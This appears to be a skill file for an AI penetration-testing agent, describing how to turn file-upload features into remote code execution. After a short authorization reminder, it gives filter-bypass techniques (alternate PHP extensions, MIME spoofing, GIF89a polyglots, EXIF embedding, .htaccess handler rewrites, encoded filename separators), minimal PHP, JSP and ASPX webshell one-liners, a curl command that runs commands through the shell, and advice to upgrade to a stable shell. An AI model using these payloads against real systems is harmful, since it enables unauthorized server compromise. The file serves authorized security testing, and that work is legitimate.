---
name: web-upload-rce
description: "File upload abuse to code execution. Triggers - multipart upload, avatar, import, attachment, /uploads/."
tags: [vuln_assess, exploitation]
---

## Rules of Engagement
Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.

# File Upload → RCE

## When this fires
Any upload sink (avatar, doc, image, CSV/XML import, attachment) where you control filename, content-type, or bytes — and there's a chance the upload dir is web-served or interpreted.

## Detect
1. Upload a benign file, find WHERE it lands (response URL, predictable `/uploads/<name>`, guess via ffuf).
2. Probe the filter: try `.php`, `.phtml`, `.php5`, `.phar`, `.jsp`, `.aspx` — note what's rejected and HOW (extension vs MIME vs magic-byte vs content-scan).

## Decide — which bypass
- **Extension blocklist** → `.phtml`/`.php5`/`.phar`/`.pht`; double `shell.php.jpg`; trailing `shell.php%00.jpg` (old); case `shell.PHP`; `.php.` (Apache).
- **MIME check only** → keep `.php`, set `Content-Type: image/png`.
- **Magic-byte/content check** → prepend `GIF89a;` or valid image header, then PHP: `GIF89a;<?php system($_GET['c']); ?>`. Or embed in EXIF (`exiftool -Comment='<?php ...?>' x.jpg`).
- **Server config writable** → upload `.htaccess` (`AddType application/x-httpd-php .jpg`) then a `.jpg` webshell.
- **SVG/XML upload** → stored XSS or XXE (see web-xxe). **Zip/import** → path traversal (`../../`) to write outside the upload dir.

## Filename normalization bypass
Desync the filter's parser from the server's by inserting an encoded separator between the executable and allowed extension (`shell.php<X>.png`):
- Run `filename_bypass` with `name`, `extension`, `allowed`. It generates raw, percent, double-percent, `\x`, HTML-entity, JS-unicode, and overlong-UTF-8 forms of CR, LF, TAB, NUL, `#`, `;`, space, plus double extension, case, and trailing dot/space.
- Encodings must be real: CR is `%0d` / `\u000d` / `&#13;` / overlong `%c0%8d` / `%e0%80%8d`. Do not use CJK lookalikes such as `\u560d` or `%e5%98%8d` — those are different characters and only add noise.
- Send candidates with `pentest_shell` in the multipart `filename=` field, then request the returned path to confirm execution.

## Exploit → PROVE IMPACT
```bash
# minimal webshells
echo '<?php system($_GET["c"]); ?>' > shell.phtml     # PHP
# JSP: <% Runtime.getRuntime().exec(request.getParameter("c")); %>   ASPX: Process.Start("cmd","/c "+Request["c"])
curl 'http://<t>/uploads/shell.phtml?c=id'             # execute → prove
```
**Proof required:** `id`/`whoami` from the uploaded shell (RCE). Then upgrade to a stable shell; record it via `state_update`; drop markers where the engagement requires.

## Tooling
`filename_bypass` for encoded filename variants; `ffuf` to locate the upload dir; `exiftool` for magic-byte polyglots; `nuclei -tags fileupload`. Run dir-discovery via `pentest_shell`; output auto-parses.

## False positives / pitfalls
- Upload succeeds but dir is non-executable (static/CDN) → find an interpreted path, or pivot to LFI-include of the uploaded file.
- Antivirus/content scan strips shells → try polyglot + less-common handler extension.
- Random-renamed filename → you still need the returned path; if unknown, brute or chain with LFI.
